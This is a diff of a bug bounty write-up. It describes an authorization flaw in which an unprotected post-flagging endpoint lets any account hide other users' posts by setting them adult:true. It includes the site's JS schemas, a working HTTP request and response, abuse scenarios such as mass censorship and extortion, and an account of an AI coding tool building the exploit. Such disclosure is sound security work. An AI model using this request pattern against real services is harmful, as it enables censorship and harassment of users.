@@ -10,52 +10,94 @@ cover:
   caption: ""
 ---
 
-since i cant disclose the program lets name it target.com. target.com had alot of functions but reading js files was the move to understand the functions more and identify hidden endpoints. when i was analyzing the js files i found a really interesting block of codes.
+## recon
+
+since i can't disclose the program let's call it `target.com`. the app had a lot
+of functionality, and reading the js files was the move to understand those
+functions and find hidden endpoints. while analyzing the bundles i hit a really
+interesting block:
 
 ```js
-// POST /api/posts/{id}/moderate  — community "flag" (the BFLA endpoint), request schema only allows reason:"MATURE"
-  aq=s.z.object({description:s.z.string().optional(),reason:s.z.literal("MATURE")}),
-  aK=s.z.object({adult:s.z.boolean().optional(),message:s.z.string(),postId:s.z.string()}),
-  aV=async(e,t,r)=>{let{data:a}=await e.post(`/api/posts/${t}/moderate`,aq,aK,r);return a},
+// POST /api/posts/{id}/moderate — community "flag" (the BFLA endpoint), request schema only allows reason:"MATURE"
+aq=s.z.object({description:s.z.string().optional(),reason:s.z.literal("MATURE")}),
+aK=s.z.object({adult:s.z.boolean().optional(),message:s.z.string(),postId:s.z.string()}),
+aV=async(e,t,r)=>{let{data:a}=await e.post(`/api/posts/${t}/moderate`,aq,aK,r);return a},
 
-  // shared enums
-  aG={NC17:"NC17",PG:"PG",R:"R"},
-  aH={BLOCKED:"BLOCKED",COMPLETE:"COMPLETE",DELETED:"DELETED",REVIEW:"REVIEW"},
+// shared enums
+aG={NC17:"NC17",PG:"PG",R:"R"},
+aH={BLOCKED:"BLOCKED",COMPLETE:"COMPLETE",DELETED:"DELETED",REVIEW:"REVIEW"},
 
-  // POST /api/posts/{id}/moderation  — staff status/category path (correctly 403 for FREE)
-  aY=s.z.object({category:s.z.enum(aG).optional().catch(void
-  0),reason:s.z.string().trim().min(1).max(500).optional(),status:s.z.enum(aH).optional().catch(void 0)}).refine(e=>void 0!==e.status||void
-  0!==e.category,{message:"At least one of status or category must be provided."}),
-  aX=async(e,t,r)=>{let{data:a}=await e.post(`/api/posts/${t}/moderation`,aY,aY,r);return a},
+// POST /api/posts/{id}/moderation — staff status/category path (correctly 403 for FREE)
+aY=s.z.object({category:s.z.enum(aG).optional().catch(void
+0),reason:s.z.string().trim().min(1).max(500).optional(),status:s.z.enum(aH).optional().catch(void 0)}).refine(e=>void 0!==e.status||void
+0!==e.category,{message:"At least one of status or category must be provided."}),
+aX=async(e,t,r)=>{let{data:a}=await e.post(`/api/posts/${t}/moderation`,aY,aY,r);return a},
 
-  // GET /api/posts/{id}/moderation  — moderation decision log
-  io=s.z.object({createdAt:s.z.string(),decision:s.z.string(),fromCat:s.z.enum(aG).nullable().catch(null),fromStatus:s.z.enum(aH).catch("REVIEW"
-  ),id:s.z.string(),reason:s.z.string().nullable(),reviewerId:s.z.string().nullable(),toCat:s.z.enum(aG).nullable().catch(null),toStatus:s.z.enu
-  m(aH).catch("REVIEW")}),
-  is=s.z.object({data:s.z.array(io)}),
-  il=async(e,t)=>{let{data:r}=await e.get(`/api/posts/${t}/moderation`,is);return r}
-
+// GET /api/posts/{id}/moderation — moderation decision log
+io=s.z.object({createdAt:s.z.string(),decision:s.z.string(),fromCat:s.z.enum(aG).nullable().catch(null),fromStatus:s.z.enum(aH).catch("REVIEW"
+),id:s.z.string(),reason:s.z.string().nullable(),reviewerId:s.z.string().nullable(),toCat:s.z.enum(aG).nullable().catch(null),toStatus:s.z.enu
+m(aH).catch("REVIEW")}),
+is=s.z.object({data:s.z.array(io)}),
+il=async(e,t)=>{let{data:r}=await e.get(`/api/posts/${t}/moderation`,is);return r}
 ```
 
-this was so suspicious to me. i gave it to claude code to analyze it. and went to get a coffee then tried to send requests with the id of the post but the request needed other parameters. surprisingly claude code exploited it in 10 minutes! the issue was that endpoint can hide anypost by setting `adult=true`. why is it even an issue? that was my question. after more analyzing. setting REASON parameter to mature made the post get flagged `adult=true` and that flag hides the post from the default feed.
+## the two endpoints (this is the whole bug)
 
-that is the request and the response
+look closely — there are two near-identical moderation routes, one character apart:
 
+- `POST /api/posts/{id}/moderation` — the **staff** path (status/category). this
+  one is locked down correctly: a free account gets **403**.
+- `POST /api/posts/{id}/moderate` — the **community "flag"** path. same prefix,
+  no trailing `-tion`. this one has **no authorization check at all**.
+
+the protection was applied to one of two sibling endpoints and forgotten on the
+other. that's it. that's the finding.
+
+## exploitation
+
+i gave the block to claude code to help me shape the request fast, grabbed a
+coffee, and came back to a working call in ~10 minutes. the schema told me all i
+needed: `reason:"MATURE"` is the only required field.
+
+so from a **low-priv attacker account (A)**, against a **victim's post (B)**
+that A doesn't own:
+
+```http
+POST /api/posts/cmpxelehi005e01s6d9jp4vc0/moderate HTTP/2
+Host: target.com
+Authorization: Bearer <attacker account A>
+Content-Type: application/json
+
+{"reason":"MATURE"}
 ```
-  POST /api/posts/cmpxelehi005e01s6d9jp4vc0/moderate HTTP/2
-  Host: target.com
-  Authorization: Bearer <any account>
-  Content-Type: application/json
 
-  {"reason":"MATURE"}
+response — the mutation happening server-side:
 
-  Response (the mutation happening server-side):
-  HTTP/2 200
-  {"message":"Post flagged successfully.","postId":"cmpxelehi005e01s6d9jp4vc0","adult":true}
+```http
+HTTP/2 200
+{"message":"Post flagged successfully.","postId":"cmpxelehi005e01s6d9jp4vc0","adult":true}
 ```
 
-notice that the response has `"adult":true`. which made the post get flagged and get hidden from the default feed.
+note the `"adult":true` in the response. that flag is what hides the post from
+the default feed.
 
-reported it to the program and they rewarded it with $$$ bounty.
+**before:** the post is visible in the default feed.
+**after:** one request later, it's gone. _(screenshots: feed before / feed after)_
 
-Thanks for reading
+what makes this a vuln and not a normal "report this post" feature:
+
+- a **single** flag from **one ordinary account** instantly sets `adult:true` —
+  no threshold, no quorum, no human review queue.
+- it works on **posts you don't own** (cross-account → the BOLA half).
+- **no rate limit**, so you can sweep a whole creator's feed, not just one post.
+- the victim can't trivially undo it themselves.
+
+## impact
+
+any authenticated user can unilaterally take down arbitrary content. concretely:
+silence a competitor's announcement, suppress a creator/journalist, mass-hide a
+target's entire feed, or extort ("pay or your posts stay hidden"). it's a
+content-integrity / censorship primitive available to every logged-in user.
+
+**class:** broken function-level authorization (BFLA) — a privileged moderation
+action exposed with no role check, and no object-level ownership scoping.
